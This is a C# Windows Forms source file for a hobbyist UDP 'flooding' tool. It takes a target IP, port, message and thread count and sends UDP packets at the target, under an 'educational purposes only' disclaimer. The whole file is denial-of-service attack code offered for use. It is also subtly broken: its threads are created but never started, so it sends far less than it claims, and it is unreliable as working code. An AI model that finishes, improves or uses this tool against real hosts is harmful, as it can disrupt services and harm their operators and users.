using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace wpfVer2
{
    public partial class Form1 : Form
    {
        public bool active;
        public Form1()
        {
            InitializeComponent();
            MessageBox.Show("DISCLAIMER: I am not responsible for any damage caused by this program. This program is intended for educational purposes ONLY. Proceed with caution.");
        }

        private void label1_Click(object sender, EventArgs e) // this was an accident but now i can't delete it :/
        {

        }

        private void start_Click(object sender, EventArgs e)
        {
            if (active)
            {
                MessageBox.Show("Flooding is still in progress.");
            }
            else
            {
                MessageBox.Show("Flooding started.");
                active = true;
                floodSetVar(); // this sets the variables and opens threads
            }
        }

        public void flood(string ip, int port, UdpClient client, string message)
        {
            if (active)
            {
                try
                {
                    client.Connect(ip, port); // this is where the fun starts 
                    byte[] sendBytes = Encoding.ASCII.GetBytes(message); // i don't actually know what to put here so i just put a simple http get request
                    client.AllowNatTraversal(true);
                    client.DontFragment = true;
                    client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
                }
                catch
                {
                    MessageBox.Show("There was an error. Ensure that you have an internet connection and that all the data is entered correctly.");
                    active = false;
                }
            }
        }
        public void floodSetVar()
        {
            string ipaddr = ipText.Text;
            int por = Int32.Parse(portText.Text);
            string message = messageText.Text;
            int threads = Int32.Parse(threadText.Text);
            if (threads > 32)
            {
                MessageBox.Show("WARNING: Too many threads could cause problems if an error occurs. Proceed with caution."); // idk how many threads is too many but i think 32 might be it
            }
            UdpClient client2 = new UdpClient(ipaddr, por); // this is just the udp client, nothing interesting
            for (int i = 1; i < threads; i++) // this opens all the threads
            {
                new Thread(() => flood(ipaddr, por, client2, message));
            }
        }

        private void stop_Click(object sender, EventArgs e)
        {
            active = false;
        }
    }
}
